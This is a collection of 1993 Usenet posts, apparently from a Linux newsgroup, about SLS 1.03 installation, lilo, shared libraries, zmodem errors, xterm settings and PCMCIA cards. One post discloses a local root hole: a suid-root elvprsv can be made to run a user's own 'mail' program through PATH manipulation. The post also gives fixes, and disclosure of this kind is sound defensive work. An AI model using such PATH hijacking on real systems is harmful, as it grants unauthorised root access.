Does this mean I have to download the world again?  I had just finished
copying all of the SLS 1.03 stuff (8/7/93 ver) to floppy and I read this.

Are there only segments that I can get, or should I get
it all...  Not to sound too stupid, but I just wanted to know.

Just to prove it can be done :-) I can boot DOS5 using lilo in SLS 1.01,

The HD spinning down simply generates an "unexpected HD interupt."
MAny people either redirect this to an unused VC, or comment the
message out of the kernel source.  

I have tested suspend mode with the SLS a1 disk on the AST PowerExec,
and there were no problems.  (One's coming in the mail! I can't wait)
Pressing the suspend key again instantly brought up my shell.  Some
systems do have problems with sleep and suspend; however many don't,
including the AST, NEC, possibly the zenith, and others.  Mail me for
a summary I made in the earlier part of the summer.

Just look at the dates on tsx-11.  There are only four disks that
have changed since the 7th.  You don't even have to download the
whole disks, just note the changes in them.

Subject: non-fixed shared library loader path for Linux?
Date: 12 Aug 1993 21:38:53 GMT

 Is /lib hardcoded into the kernel as the shared library path, or
would it be possible to implement a user-defineable shlib loader path 
just like on SUN machines?
 
 Incidentally, I would also like to know if one can use mkhole to make
holes in shared libs so they would take up less space. (The docs say one
can only apply mkhole on "pure executables" but what that means is not
defined precisely. I am sure that on Hlu's combo disks the shlibs are 
compressed somehow, because otherwise all that stuff wouldn't fit on a 
1440k floppy. And yes, I know that GNU cp also makes holes in executables.)

Well, yes. that's the bottom line, isn't it. Nobody seems to have seen
this mythical code except for your "beta" group, and nobody in that group
seems to be willing to admit it.

Why don't you just do what everyone else who's working on drivers for 386BSD

I'd guess that you have 16450's (or another non-16550 UART) and your
CRC errors coincide with when 'update' syncs the disk. If this is the
case, try killing update before your transfer (you can restart it after).

I've noticed this in several systems, both IDE and SCSI based; it just
appears to take too long to flush the buffer caches to keep zmodem
happy :-)

Subject: security holes
Date: Fri, 13 Aug 1993 01:15:35 GMT


Hi.
  Since Linux is hacker ware to start with I thought it would be
kosher to post security holes to the world, since people running
linux would want to know what the holes are and how to fix them,
which doesnt seem to be what big brother CERT is all about.

Anway the hole:

  there is a vulnerability in /usr/bin/elvprsv (didnt you just
expect it?).  If it is installed suid root on your machine users
may use it to get root on your system.

problem:  elvprsv exec's the file 'mail' but does not specify
  the path name.  by setting up your path correctly you can
  make it run a file owned by you named 'mail' as root.

fixes :  take suid bit off, fix the source giving a full path
  name and recompile.

notes:  I didnt test for expreserve holes from other os's.
  My bet is there are other vulnerabilities in elvprsv.
  Probably best to take its suid bit off, maybe make a
  special elvis userid and changing /usr/preserve's
  ownership (then when people break through evlprsv they
  will be able to read any preserved files).

Subject: SLS 1.03 install and missing header files
Date: 13 Aug 93 01:09:51 GMT


I have the following comments and questions to do with installation of
SLS 1.03.

Firstly, I would like to say that I really appreciate the time and effort
put into the SLS distribution by Peter. The comments following are NOT
intended to be criticisms.

- I had a lot of trouble getting SLS to install. I have a 386 with 4mb
  of memory, so the first thing I did was select the option to create
  a swap partition.
  Unfortunately, mkswap ran out of memory while trying to create the
  swap partition. This results in a catch-22 situation which should be
  resolved before the next release.

- Also due to memory shortage (and no swap space), some of the packages
  failed to install and had to be done by hand afterwards.

- Now I have a working system, I appear to be missing many of the gcc
  header files (stddef.h, float.h, to name two). Does anyone know from
  which package they should be extracted ?

Thanks in advance, Mark.

Xterm gets the current stty settings from its controlling terminal then 
detaches itself, reattaches to a new pty and applies them. If it doesn't 
have a controliing terminal to read to start with it uses compiled in 
defaults which are the traditional teletype values.

  You can override the compiled in defaults by adding a ttyModes resource to 
/usr/X386/lib/X11/app-defaults/Xterm. Syntax is like stty options. See the

I install SLS from cartridge tape and had problems figuring this out also.
What I did was create a directory, downloaded all of SLS, and made an a1
disk. I don't know if the order of the files on the tape is important, but
I decided to play it safe, so I made sure I tarred the files in order.

If you have a directory for each disk (same way the files are stored on tsx-11)
just make a tar tape of the whole set:

tar cvf /dev/your-tape-drive ?? ???

(I use ?? and ??? so that the directories are in order: a2 a3 a4... x7 x8 x9 x10
if I used . or * x10 would be between x1 and x2).

Hope this makes sense.... I sure like installing from tape better than doing 30
floppy swaps.

New Media has something they call a multimedia card that supposedly
handles digital sound.  There will likely be other digital sound cards
to appear before long.  That's the only thing I can think of as an
"audio" card.

If you have the Socket Communications Ethernet card supported, it is
likely that a number of other cards are supported.  All the ones that
claim to be NE-2000 compatible most likely come from the same design.

Except for RAM cards, what isn't standard?  There is a very detailed spec
for what configuration a card has.  For example, with a modem card, you
should be able to determine what features it has.  With LAN cards, it
depends on whether the vendor is using the approved LAN tuple yet or
not to get some information, but the I/O addresses and vendor info are
usually there.  You still need to have some specific drivers to deal
with differences between cards from different vendors for LAN cards.
This is the same as all other Ethernet cards for ISA, EISA, MCA, etc.

The 82365 and some clones of it (like Toshiba) are probably the most common.
The next most is probably the Databook controllers.  Cirrus Logic is
another one and it is very similar to the 82365 but has a couple of
differences.  There are a few more but they seem to be a little less 
common.
